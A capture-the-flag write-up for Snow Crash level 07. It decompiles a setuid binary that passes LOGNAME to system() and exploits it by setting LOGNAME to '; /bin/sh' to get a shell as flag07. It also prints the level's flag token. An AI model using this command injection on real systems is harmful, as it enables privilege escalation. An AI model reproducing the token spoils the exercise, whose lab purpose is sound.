# Snow Crash - Level 07

## Finding the Executable

Listing the directory contents with `ls -la`, we discover an executable named `level07`. Inspecting it with `cat` reveals compiled C code, so we use a decompiler to analyze its functionality.

## Understanding the Vulnerability

The decompiled code shows that the program retrieves the `LOGNAME` environment variable, passes it to `/bin/echo`, and executes the resulting command using `system()`. Additionally, it uses `setresuid()` to execute with the file owner's privileges (`flag07`).

### Decompiled Code:

```c
int main()
{
    unsigned int v0;  // [sp-0x1c]
    void* v1;  // [sp-0x10]
    unsigned int v2;  // [sp-0xc]
    unsigned int v3;  // [sp-0x8]

    v2 = getegid();
    v3 = geteuid();
    v0 = v2;
    setresgid(v2, v2);
    v0 = v3;
    setresuid(v3, v3);
    v1 = 0;
    v0 = getenv("LOGNAME");
    asprintf(&v1, "/bin/echo %s ");
    return system(v1);
}
```

## Exploiting the Vulnerability

Since the program executes `system()`, we can manipulate `LOGNAME` to inject a command and gain a shell as `flag07`.

### Steps:

1. Set `LOGNAME` to inject `/bin/sh`:

   ```bash
   export LOGNAME="; /bin/sh"
   ```

2. Execute the vulnerable program:

   ```bash
   ./level07
   ```

3. Run `getflag` inside the new shell:

   ```bash
   $ getflag
   Check flag. Here is your token : fiumuikeil55xe9cu4dood66h
   ```

This successfully retrieves the flag by executing commands with `flag07`'s privileges.

